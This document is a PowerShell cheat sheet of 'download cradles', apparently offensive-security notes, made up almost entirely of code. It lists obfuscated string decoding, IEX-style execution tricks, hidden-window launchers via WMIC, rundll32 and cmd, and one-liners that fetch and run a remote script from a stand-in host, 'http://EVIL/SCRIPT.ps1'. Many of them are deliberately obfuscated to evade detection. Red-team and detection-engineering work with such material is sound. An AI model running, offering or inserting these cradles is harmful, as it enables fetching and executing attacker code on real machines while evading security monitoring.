### Download Cradles

#### 0) Extra goodies

- Obfuscated `FromBase64String` with `-bxor` nice for dynamic strings deobfuscation:
```
$t=([type]('{1}{0}'-f'vert','Con'));($t::(($t.GetMethods()|?{$_.Name-clike'F*g'}).Name).Invoke('Yk9CA05CA0hMV0I=')|%{$_-bxor35}|%{[char]$_})-join''
```

- The same as above but for UTF-16 base64 encoded strings:
```
$t=([type]('{1}{0}'-f'vert','Con'));-join[char[]]([uint16[]]$t::(($t.GetMethods()|?{$_.Name-clike'F*g'}).Name).Invoke('MAA7ACAAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUA')-ne0)
```

#### A) Powershell Code Execution primitives

   Phrase `(Function).Invoke()` may be rephrased as: `&(Function)`

   1. _Scriptblock_: 
   ```
   [scriptblock]::Create('Get-Service').Invoke()
   ```
   
   2. PS1.0 Invoke
   ```
   $ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).PsObject.Methods|Where{$_.Name-ilike'In*'}).Name).Invoke('Get-Service')
   ```
   
   3. Get-Alias:
   ```
   &(DIR Alias:/I*X)'Get-Service'
   ```
   
   4. Get-Command:
   ```
   &(GCM I*e-E*)
   ```
   
   5. Powershell Runspace
   ```
   [PowerShell]::Create().(([PowerShell]::Create()|Member)[5].Name).Invoke('Get-Service').Invoke()
   ```
   
   6. Concatenated IEX:
   ```
   &(''.SubString.ToString()[67,72,64]-Join'')'Get-Service'
   ```
   
   7. _Invoke-AsWorkflow_ (PS3.0+)
   ```
   Invoke-AsWorkflow -Ex ('Get-Service')
   ```

#### B) Powershell Payload Download primitives

   1. Invoke-RestMethod (PS3.0+)
   ```
   ('http://EVIL/SCRIPT.ps1'|%{(IRM $_)})
   ```
   
   2. Obfuscated `Net.WebClient.DownloadString`:
   ```
   $w=(New-Object Net.WebClient);$w.(((($w).PsObject.Methods)|?{(Item Variable:\_).Value.Name-clike'D*g'}).Name).Invoke('http://EVIL/SCRIPT.ps1')
   ```
   
   3. Net.WebRequest:
   ```
   [IO.StreamReader]::new([Net.WebRequest]::Create('http://EVIL/SCRIPT.ps1').GetResponse().GetResponseStream()).ReadToEnd()
   ```
   
   4. `Msxml2.XMLHTTP` COM object:
   ```
   $c=New-Object -ComObject MsXml2.ServerXmlHttp;$c.Open('GET','http://EVIL/SCRIPT.ps1',0);$c.Send();$c.ResponseText
   ```

#### C) Operating-System Launcher primitives

   1. WMIC:
   ```
   WMIc  "pROCESs"    cALl     crEATE "PoWErSheLL -WInDowstyLE HIdDEn -NonINTErA  Get-Service"
   ```
   
   2. Rundll32 SHELL32.DLL,ShellExec_RunDLL
   ```
   RuNDlL32.exE SHELL32,ShellExec_RunDLL "POWERsHeLL" "-w  1"  " -NonInter  "  "-CO "     "Get-Service"
   ```
   
   3. Cmd + set VAR && Powershell iex VAR
   ```
   cmd  /c"sEt   sqm=Get-Service&&PowErsHeLl  -WinDoWstY hIDDeN -NoniNtERActi  -coMmand   .(   ${E`NV:Com`sp`ec}[4,26,25]-JOIn'')( (  ^&( \"{2}{1}{0}\"-f'm','eT-ITe','G' ) ( \"{1}{0}{2}\" -f'v:S','En','qm')  ).\"vaL`Ue\")"
   ```
   
   4. Cmd + Echo | Powershell - (stdin)
   ```
   CmD.exE /c"  ECho/Get-Service  |  PoWeRsheLL  -nOninT  -WindOw hiDDe  -ComM  (gcI 'vARiaBLE:eX*xT').vAluE.InvoKECOmmanD.InVOkESCript($inPut  )"
   ```
   
   5. Cmd + Echo | Clip && Powershell iex clipboard
   ```
   cmd   /C"  ECHO/Get-Service|cLIP&&  POweRsHElL  -Windo  hIDd  -NONINTe -St -ComMaN     . (  \"{0}{1}{2}\"-f'Ad','d-',(  \"{0}{1}\" -f 'Ty','pe') ) -AN (  \"{0}{2}{4}{1}{3}\"-f'P',(\"{0}{1}\" -f'a','tio'),'res',(  \"{0}{1}\" -f'n','Core'  ),'ent' )   ;    ^&   (  ( [sTriNG]${ve`R`B`oSepRE`F`eRENce}  )[1,3] +  'x'-joiN'' ) (( [WInDoWS.cLipBoARd]::( \"{1}{2}{0}\" -f't','Get','Tex').\"i`N`VoKE\"(  )) )   ; [Windows.Clipboard]::( \"{1}{0}\" -f'ar','Cle').\"I`Nv`OkE\"( )"
   ```
   

#### D) Combined Download Cradles

   1. PowerShell 3.0+
   ```
   IEX (iwr 'http://EVIL/SCRIPT.ps1')
   ```
   
   2. Normal download cradle
   ```
   IEX (New-Object Net.Webclient).downloadstring("http://EVIL/SCRIPT.ps1")
   ```

   3. Download Cradle combining _ScriptBlock_ + `Invoke-RestMethod`
   ```
   [scriptblock]::Create(('http://EVIL/SCRIPT.ps1'|%{(IRM $_)})).Invoke()
   ```
   
   4. `Msxml2.XMLHTTP` COM object with Scriptblock:
   ```
   $c=New-Object -ComObject MsXml2.ServerXmlHttp;$c.Open('GET','http://EVIL/SCRIPT.ps1',0);$c.Send();[scriptblock]::Create($c.ResponseText).Invoke()
   ```
   
   5. Minimized `Net.WebRequest` combined with _ScriptBlock_ execution:
   ``` 
   [scriptblock]::Create([IO.StreamReader]::new([Net.WebRequest]::Create('http://EVIL/SCRIPT.ps1').GetResponse().GetResponseStream()).ReadToEnd()).Invoke()
   ```

   6. A bit obfuscated `Net.WebClient.DownloadString` with Get-Alias IEX variant:
   ```
   $w=(New-Object Net.WebClient);$w.(((($w).PsObject.Methods)|?{(Item Variable:\_).Value.Name-clike'D*g'}).Name).Invoke('http://EVIL/SCRIPT.ps1')|&(DIR Alias:/I*X)
   ```
   
   7. Obfuscated `Net.HttpWebRequest` with _Get-Command IEX`:
   ```
   $h=[tYpE]('{1}{2}{0}'-f('pWebRe'+'quest'),'Ne','t.Htt');$v=((((gET-vAriABLE h).vAlue::Create('http://EVIL/SCRIPT.ps1').PSObject.Methods|?{$_.Name-clike'G*se'}).Invoke()).PSObject.Methods|?{$_.Name-clike'G*eam'}).Invoke();$r='';Try{While($r+=[Char]$v.ReadByte()){}}Catch{};&(GCM *ke-*pr*)$r
   ```